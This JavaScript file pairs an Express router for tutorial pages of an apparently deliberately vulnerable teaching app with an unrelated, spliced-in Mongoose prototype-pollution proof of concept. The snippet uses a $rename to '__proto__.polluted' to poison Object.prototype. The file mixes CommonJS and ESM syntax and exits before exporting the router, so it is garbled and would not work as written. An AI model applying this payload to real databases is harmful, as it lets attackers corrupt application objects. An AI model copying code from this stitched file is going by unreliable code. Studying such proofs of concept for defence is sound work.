const express = require("express");
const {
    environmentalScripts
} = require("../../config/config");

const router = express.Router();

router.get("/", (req, res) => {
    "use strict";
    return res.render("tutorial/a1", {
        environmentalScripts
    });
});

const pages = [
    "a1",
    "a2",
    "a3",
    "a4",
    "a5",
    "a6",
    "a7",
    "a8",
    "a9",
    "a10",
    "redos",
    "ssrf"
];

for(const page of pages) {
    router.get(`/${page}`, (req, res) => {
        "use strict";
        return res.render(`tutorial/${page}`, {
            environmentalScripts
        });
    });
}

import { connect, model, Schema } from '@seal-security/mongoose-fixed';

await connect('mongodb://127.0.0.1:27017/exploit');

const Example = model('Example', new Schema({ hello: String }));

const example = await new Example({ hello: 'world!' }).save();
await Example.findByIdAndUpdate(example._id, {
    $rename: {
        hello: '__proto__.polluted'
    }
});

// this is what causes the pollution
await Example.find();

const test = {};
console.log(test.polluted); // world!
console.log(Object.prototype); // [Object: null prototype] { polluted: 'world!' }

process.exit();

module.exports = router;
